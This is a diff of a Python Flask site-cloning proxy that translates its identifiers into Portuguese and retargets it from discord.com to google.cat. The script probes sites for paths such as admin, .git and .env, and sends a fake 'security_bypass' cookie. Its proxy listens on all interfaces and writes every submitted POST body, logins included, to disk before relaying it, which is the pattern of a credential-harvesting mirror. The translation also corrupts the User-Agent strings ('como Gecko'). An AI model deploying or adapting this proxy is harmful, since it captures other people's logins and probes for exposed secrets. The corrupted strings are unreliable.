@@ -13,42 +13,42 @@ import platform
 
 # Importa lib Windows para tratar caminhos longos e inválidos
 try:
-    from lib_windows_eng import safe_path, remove_long_path_prefix, ENABLE_WIN_LIB
-    ENABLE_WIN_LIB()
+    from lib_windows_eng import safe_path, remove_long_path_prefix, enable_windows_lib
+    enable_windows_lib()
 except Exception as e:
-    print(f"[WARN] lib_windows_eng não pôde ser ativada: {e}")
+    print(f"[AVISO] lib_windows_eng não pôde ser ativada: {e}")
 
 sys.setrecursionlimit(10000)
 
 # ---------------- CONFIGURAÇÃO GLOBAL ----------------
 
-MODE = "AUTO_MODE"
-SITE_URL = "https://discord.com"
-PORT = 80
+MODO = "AUTO_MODE"
+URL_SITE = "https://google.cat"
+PORTA = 80
 
-FORCE_ACCESS_DENIED_BYPASS = False  # Ativa táticas para evitar bloqueios Access Denied
-SCAN_FOR_HIDDEN_PATHS = False       # Ativa busca por URLs ocultas (admin, login etc)
-ENABLE_HIDDEN_ELEMENTS = False      # Durante crawling, habilita elementos ocultos no HTML
-SHOW_HIDDEN_ELEMENTS = False        # Durante resposta HTTP, exibe elementos ocultos
-ENABLE_CRAWLING = True              # Ativa crawler automático
-HEADER_DEVICE = "desktop"           # desktop, mobile, tablet, bot, auto
-ACCEPT_ALL_MIRRORS_REQUEST = True  # Aceita baixar mirrors automaticamente
+FORCAR_BYPASS_ACCESS_DENIED = False  # Ativa táticas para evitar bloqueios Access Denied
+VARREDURA_CAMINHOS_OCULTOS = False  # Ativa busca por URLs ocultas (admin, login etc)
+ATIVAR_ELEMENTOS_OCULTOS = False    # Durante crawling, habilita elementos ocultos no HTML
+MOSTRAR_ELEMENTOS_OCULTOS = False   # Durante resposta HTTP, exibe elementos ocultos
+ATIVAR_CRAWLING = True              # Ativa crawler automático
+HEADER_DISPOSITIVO = "desktop"       # desktop, mobile, tablet, bot, auto
+ACEITAR_TODOS_MIRRORS = True         # Aceita baixar mirrors automaticamente
 
 # ----------- Variáveis internas -------------
-visited = set()
-MAX_VISITED = 1000
+visitados = set()
+MAX_VISITADOS = 1000
 app = Flask(__name__, static_folder=None)
 
-# Define paths para salvar arquivos localmente
-SITE_NAME = urlparse(SITE_URL).netloc.replace("www.", "").replace(".", "_")
-SITE_SRC = os.path.join("site_src", f"{SITE_NAME}_{HEADER_DEVICE}")
-SITE_DATA = os.path.join("site_data", f"{SITE_NAME}_{HEADER_DEVICE}")
+# Define caminhos para salvar arquivos localmente
+NOME_SITE = urlparse(URL_SITE).netloc.replace("www.", "").replace(".", "_")
+FONTE_SITE = os.path.join("site_src", f"{NOME_SITE}_{HEADER_DISPOSITIVO}")
+DADOS_SITE = os.path.join("site_data", f"{NOME_SITE}_{HEADER_DISPOSITIVO}")
 
 # ---------- Funções utilitárias -------------
 
-def detect_device():
-    if HEADER_DEVICE != "auto":
-        return HEADER_DEVICE.lower()
+def detectar_dispositivo():
+    if HEADER_DISPOSITIVO != "auto":
+        return HEADER_DISPOSITIVO.lower()
     ua = request.headers.get("User-Agent", "").lower()
     if "android" in ua and "mobile" in ua:
         return "mobile"
@@ -62,18 +62,18 @@ def detect_device():
         return "bot"
     return "desktop"
 
-def get_headers_for_device(device):
+def cabecalhos_para_dispositivo(dispositivo):
     base_headers = {
         "desktop": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Safari/537.36",
             "Accept-Encoding": "br, gzip",
         },
         "mobile": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Mobile Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Mobile Safari/537.36",
             "Accept-Encoding": "br, gzip",
         },
         "tablet": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Tablet) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Safari/537.36",
             "Accept-Encoding": "br, gzip",
         },
         "bot": {
@@ -81,9 +81,9 @@ def get_headers_for_device(device):
             "Accept-Encoding": "gzip, deflate",
         },
     }
-    return base_headers.get(device, base_headers["desktop"])
+    return base_headers.get(dispositivo, base_headers["desktop"])
 
-def local_path(url):
+def caminho_local(url):
     """Caminho seguro com prefixo para ler/gravar arquivo localmente"""
     p = urlparse(url)
     path = p.path
@@ -91,10 +91,10 @@ def local_path(url):
         path += "index.html"
     if not os.path.splitext(path)[1]:
         path = os.path.join(path, "index.html")
-    full_path = os.path.join(SITE_SRC, p.netloc, path.lstrip("/"))
-    return safe_path(full_path)
+    caminho_completo = os.path.join(FONTE_SITE, p.netloc, path.lstrip("/"))
+    return safe_path(caminho_completo)
 
-def local_path_for_flask(url):
+def caminho_local_para_flask(url):
     """Caminho sem prefixo para enviar arquivo via Flask"""
     p = urlparse(url)
     path = p.path
@@ -102,33 +102,35 @@ def local_path_for_flask(url):
         path += "index.html"
     if not os.path.splitext(path)[1]:
         path = os.path.join(path, "index.html")
-    return os.path.join(SITE_SRC, p.netloc, path.lstrip("/"))
+    return os.path.join(FONTE_SITE, p.netloc, path.lstrip("/"))
 
-def try_decompress(r):
-    content = r.content
+def tentar_descompactar(r):
+    conteudo = r.content
     encoding = r.headers.get("Content-Encoding", "")
     if "br" in encoding:
-        try: return brotli.decompress(content)
+        try:
+            return brotli.decompress(conteudo)
         except Exception as e:
-            print(f"[WARN] Brotli decompress failed: {e}")
+            print(f"[AVISO] Falha ao descompactar Brotli: {e}")
     if "gzip" in encoding:
-        try: return gzip.decompress(content)
+        try:
+            return gzip.decompress(conteudo)
         except Exception as e:
-            print(f"[WARN] Gzip decompress failed: {e}")
-    return content
+            print(f"[AVISO] Falha ao descompactar Gzip: {e}")
+    return conteudo
 
-def already_downloaded(url):
-    return os.path.exists(local_path(url))
+def ja_baixado(url):
+    return os.path.exists(caminho_local(url))
 
-def save_content(url, content):
-    path = local_path(url)
+def salvar_conteudo(url, conteudo):
+    path = caminho_local(url)
     os.makedirs(os.path.dirname(path), exist_ok=True)
     with open(path, "wb") as f:
-        f.write(content)
+        f.write(conteudo)
     return path
 
-def modify_html_for_visibility(soup):
-    """Remove ocultação CSS e atributos de elementos para mostrar conteúdos escondidos"""
+def modificar_html_para_visibilidade(soup):
+    """Remove ocultação CSS e atributos para mostrar conteúdos escondidos"""
     for el in soup.select("[style*='display:none'], [style*='visibility:hidden'], [style*='opacity:0']"):
         el['style'] = "display:block !important; visibility:visible !important; opacity:1 !important; background:yellow; border:2px dashed red;"
     for attr in ["hidden", "disabled", "readonly"]:
@@ -140,83 +142,83 @@ def modify_html_for_visibility(soup):
         el["href"] = el["data-href"]
         el.string = el.get_text() or el["data-href"]
 
-def is_valid_url(url):
+def url_valida(url):
     p = urlparse(url)
     return bool(p.netloc) and bool(p.scheme)
 
-# ---------------- Mirror Handling -----------------
+# ---------------- Tratamento de Mirrors -----------------
 
-def ask_user_about_mirror(filename, mirrorurl):
-    global ACCEPT_ALL_MIRRORS_REQUEST
-    if ACCEPT_ALL_MIRRORS_REQUEST:
+def perguntar_ao_usuario_sobre_mirror(nome_arquivo, url_mirror):
+    global ACEITAR_TODOS_MIRRORS
+    if ACEITAR_TODOS_MIRRORS:
         return True
-    print(f"\nMirror detectado: {mirrorurl}\nArquivo: {filename}")
+    print(f"\nMirror detectado: {url_mirror}\nArquivo: {nome_arquivo}")
     print("[S] Sim   [N] Não   [A] Aceitar todos")
     while True:
-        choice = input("Sua escolha (S/N/A): ").strip().lower()
-        if choice == "s":
+        escolha = input("Sua escolha (S/N/A): ").strip().lower()
+        if escolha == "s":
             return True
-        elif choice == "n":
+        elif escolha == "n":
             return False
-        elif choice == "a":
-            ACCEPT_ALL_MIRRORS_REQUEST = True
+        elif escolha == "a":
+            ACEITAR_TODOS_MIRRORS = True
             return True
 
-def check_and_download_mirror(url):
-    if ask_user_about_mirror(os.path.basename(urlparse(url).path), url):
-        crawl(url)
+def verificar_e_baixar_mirror(url):
+    if perguntar_ao_usuario_sobre_mirror(os.path.basename(urlparse(url).path), url):
+        varrer(url)
 
-# --------------- Crawling & Download ----------------
+# --------------- Crawling e Download ----------------
 
-def download(url):
-    if already_downloaded(url):
+def baixar(url):
+    if ja_baixado(url):
         print(f"[CACHE] {url}")
-        return local_path(url)
-    device = detect_device()
-    headers = get_headers_for_device(device)
+        return caminho_local(url)
+    dispositivo = detectar_dispositivo()
+    headers = cabecalhos_para_dispositivo(dispositivo)
 
     # Bypass Access Denied (exemplo simples)
-    if FORCE_ACCESS_DENIED_BYPASS:
-        headers["Referer"] = SITE_URL
+    if FORCAR_BYPASS_ACCESS_DENIED:
+        headers["Referer"] = URL_SITE
         headers["Cookie"] = "security_bypass=true"
 
     try:
         print(f"[GET] {url}")
         r = requests.get(url, headers=headers, timeout=15)
         r.raise_for_status()
-        content = try_decompress(r)
-        return save_content(url, content)
+        conteudo = tentar_descompactar(r)
+        return salvar_conteudo(url, conteudo)
     except Exception as e:
         print(f"[ERRO] {url}: {e}")
         return None
 
-def is_html(content):
-    c = content.strip().lower()
+def is_html(conteudo):
+    c = conteudo.strip().lower()
     return c.startswith(b"<!doctype") or b"<html" in c
 
-def crawl(url):
-    global visited
-    if len(visited) >= MAX_VISITED:
+def varrer(url):
+    global visitados
+    if len(visitados) >= MAX_VISITADOS:
         print("[AVISO] Limite máximo de URLs visitadas atingido")
         return
-    if url in visited:
+    if url in visitados:
         return
-    visited.add(url)
+    visitados.add(url)
 
-    saved_path = download(url)
-    if not saved_path:
+    caminho_salvo = baixar(url)
+    if not caminho_salvo:
         return
-    with open(saved_path, "rb") as f:
-        content = f.read()
+    with open(caminho_salvo, "rb") as f:
+        conteudo = f.read()
 
-    if not is_html(content):
+    if not is_html(conteudo):
         return
 
-    soup = BeautifulSoup(content, "html.parser")
+    soup = BeautifulSoup(conteudo, "html.parser")
 
-    if ENABLE_HIDDEN_ELEMENTS:
-        modify_html_for_visibility(soup)
-        with open(saved_path, "w", encoding="utf-8") as f:
+    if ATIVAR_ELEMENTOS_OCULTOS:
+        modificar_html_para_visibilidade(soup)
+        with open(caminho_salvo, "w", encoding="utf-8") as f:
             f.write(str(soup))
 
     # Busca links para crawling
@@ -233,95 +235,95 @@ def crawl(url):
             src = el.get(attr)
             if not src:
                 continue
-            full_url = urljoin(url, src)
-            if is_valid_url(full_url):
-                if urlparse(full_url).netloc == urlparse(SITE_URL).netloc:
-                    crawl(full_url)
+            url_completa = urljoin(url, src)
+            if url_valida(url_completa):
+                if urlparse(url_completa).netloc == urlparse(URL_SITE).netloc:
+                    varrer(url_completa)
                 else:
-                    check_and_download_mirror(full_url)
+                    verificar_e_baixar_mirror(url_completa)
 
     # Busca links <a href> internos
     for a in soup.find_all("a", href=True):
         link = urljoin(url, a["href"])
-        if link.startswith(SITE_URL):
-            crawl(link)
+        if link.startswith(URL_SITE):
+            varrer(link)
 
-    # Scan hidden paths (admin, .git, etc)
-    if SCAN_FOR_HIDDEN_PATHS:
-        common_hidden = ["admin", "login", "panel", "dashboard", ".git", ".env"]
-        for hp in common_hidden:
-            hp_url = urljoin(SITE_URL + "/", hp)
+    # Varredura de caminhos ocultos (admin, .git, etc)
+    if VARREDURA_CAMINHOS_OCULTOS:
+        comuns_ocultos = ["admin", "login", "panel", "dashboard", ".git", ".env"]
+        for caminho_oculto in comuns_ocultos:
+            url_oculta = urljoin(URL_SITE + "/", caminho_oculto)
             try:
-                r = requests.get(hp_url, headers=get_headers_for_device(detect_device()), timeout=10)
+                r = requests.get(url_oculta, headers=cabecalhos_para_dispositivo(detectar_dispositivo()), timeout=10)
                 if r.status_code == 200 and is_html(r.content):
-                    print(f"[OCULTO] {hp_url}")
-                    crawl(hp_url)
+                    print(f"[OCULTO] {url_oculta}")
+                    varrer(url_oculta)
             except:
                 pass
 
-# ----------------- Flask Proxy ----------------------
+# ----------------- Proxy Flask ----------------------
 
 @app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
 @app.route("/<path:path>", methods=["GET", "POST"])
 def proxy(path):
-    target = urljoin(SITE_URL + "/", path)
+    alvo = urljoin(URL_SITE + "/", path)
     if request.query_string:
-        target += "?" + request.query_string.decode()
+        alvo += "?" + request.query_string.decode()
 
-    local_internal = local_path(target)
-    local_flask = remove_long_path_prefix(local_internal)
+    local_interno = caminho_local(alvo)
+    local_flask = remove_long_path_prefix(local_interno)
 
     if request.method == "POST":
-        data = request.get_data()
-        os.makedirs(SITE_DATA, exist_ok=True)
-        h = hashlib.sha256(target.encode() + data).hexdigest()
-        with open(safe_path(os.path.join(SITE_DATA, h + ".json")), "wb") as f:
-            f.write(data)
+        dados = request.get_data()
+        os.makedirs(DADOS_SITE, exist_ok=True)
+        h = hashlib.sha256(alvo.encode() + dados).hexdigest()
+        with open(safe_path(os.path.join(DADOS_SITE, h + ".json")), "wb") as f:
+            f.write(dados)
         try:
-            r = requests.post(target, data=data, headers=request.headers)
+            r = requests.post(alvo, data=dados, headers=request.headers)
             return Response(r.content, status=r.status_code, content_type=r.headers.get("Content-Type"))
         except Exception as e:
             return Response(f"Erro: {e}", status=502)
 
-    if os.path.exists(local_internal):
+    if os.path.exists(local_interno):
         mime = mimetypes.guess_type(local_flask)[0] or "application/octet-stream"
-        if SHOW_HIDDEN_ELEMENTS:
+        if MOSTRAR_ELEMENTOS_OCULTOS:
             # Lê e modifica conteúdo para mostrar elementos ocultos na resposta
-            with open(local_internal, "r", encoding="utf-8", errors="ignore") as f:
+            with open(local_interno, "r", encoding="utf-8", errors="ignore") as f:
                 html = f.read()
             soup = BeautifulSoup(html, "html.parser")
-            modify_html_for_visibility(soup)
+            modificar_html_para_visibilidade(soup)
             return Response(str(soup), mimetype="text/html")
         else:
             return send_file(local_flask, mimetype=mime, conditional=True)
 
     # Se arquivo não existe localmente, busca online e salva
     try:
-        headers = get_headers_for_device(detect_device())
-        if FORCE_ACCESS_DENIED_BYPASS:
-            headers["Referer"] = SITE_URL
+        headers = cabecalhos_para_dispositivo(detectar_dispositivo())
+        if FORCAR_BYPASS_ACCESS_DENIED:
+            headers["Referer"] = URL_SITE
             headers["Cookie"] = "security_bypass=true"
-        r = requests.get(target, headers=headers)
+        r = requests.get(alvo, headers=headers)
         r.raise_for_status()
-        content = try_decompress(r)
-        os.makedirs(os.path.dirname(local_internal), exist_ok=True)
-        with open(local_internal, "wb") as f:
-            f.write(content)
-        return Response(content, status=r.status_code, content_type=r.headers.get("Content-Type"))
+        conteudo = tentar_descompactar(r)
+        os.makedirs(os.path.dirname(local_interno), exist_ok=True)
+        with open(local_interno, "wb") as f:
+            f.write(conteudo)
+        return Response(conteudo, status=r.status_code, content_type=r.headers.get("Content-Type"))
     except Exception as e:
         return Response(f"Erro remoto: {e}", status=500)
 
-# -------------------- MAIN ----------------------------
+# -------------------- PRINCIPAL ----------------------------
 
 if __name__ == "__main__":
-    os.makedirs(SITE_SRC, exist_ok=True)
-    os.makedirs(SITE_DATA, exist_ok=True)
-    if ENABLE_CRAWLING:
-        print(f"Iniciando crawling do site: {SITE_URL} (modo: {MODE})")
-        crawl(SITE_URL)
+    os.makedirs(FONTE_SITE, exist_ok=True)
+    os.makedirs(DADOS_SITE, exist_ok=True)
+    if ATIVAR_CRAWLING:
+        print(f"Iniciando crawling do site: {URL_SITE} (modo: {MODO})")
+        varrer(URL_SITE)
     else:
         print("Crawling desativado.")
-    print(f"Arquivos salvos em: {os.path.abspath(SITE_SRC)}")
-    print(f"POSTs salvos em: {os.path.abspath(SITE_DATA)}")
-    print(f"Servidor rodando em: http://127.0.0.1:{PORT}")
-    app.run(host="0.0.0.0", port=PORT)
+    print(f"Arquivos salvos em: {os.path.abspath(FONTE_SITE)}")
+    print(f"POSTs salvos em: {os.path.abspath(DADOS_SITE)}")
+    print(f"Servidor rodando em: http://127.0.0.1:{PORTA}")
+    app.run(host="0.0.0.0", port=PORTA)
